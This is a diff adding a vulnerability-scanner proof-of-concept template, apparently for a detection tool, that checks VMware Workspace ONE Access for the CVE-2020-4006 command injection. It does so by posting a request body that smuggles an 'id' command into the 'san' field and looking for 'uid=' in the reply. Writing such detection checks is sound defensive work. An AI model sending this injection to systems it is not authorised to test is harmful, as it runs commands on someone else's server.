@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 VMware Workspace ONE Access 管理配置器是否存在 CVE-2020-4006 命令注入漏洞。通过向 /cfg/setup/test 端点发送包含命令注入特征的 POST 请求，检查响应是否包含命令执行输出。"
+id = "POC-AVE-2020-1606"
+name = "VMware Workspace ONE Access 命令注入漏洞 PoC"
+severity = "critical"
+tags = ["ave-2020-1606"]
+vuln_id = [
+    "CVE-2020-4006",
+    "AVE-2020-1606",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cfg/setup/test"
+protocol = "http"
+
+[poc.requests.body]
+content = 'san=";id;echo;c:\"'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
